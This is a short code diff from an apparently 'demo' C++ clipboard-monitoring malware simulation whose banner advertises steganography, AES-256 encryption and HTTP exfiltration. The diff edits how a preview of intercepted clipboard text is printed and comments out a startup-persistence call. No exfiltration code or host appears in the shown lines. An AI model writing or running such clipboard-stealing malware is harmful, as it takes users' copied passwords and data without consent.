@@ -29,7 +29,7 @@ void HandleNewData(std::string& data, std::string& host, std::string& path, int 
     std::cout << "[DEMO] Intercepted text (" << data.length() << " chars): \"";
     
     // Show first 50 characters for demo
-    size_t previewLen = std::min((size_t)50, data.length());
+    size_t previewLen = min((size_t)50, data.length());
     std::string preview = data.substr(0, previewLen);
     std::cout << preview;
     if (data.length() > 50) std::cout << "...";
@@ -56,7 +56,7 @@ int main() {
     std::cout << "[DEMO] Advanced clipboard monitoring malware simulation" << std::endl;
     std::cout << "[DEMO] Featuring steganography, AES-256 encryption, and HTTP exfiltration\n" << std::endl;
     
-    AddToStartup();
+    // AddToStartup();
 
     std::string lastClipboard = "";
 
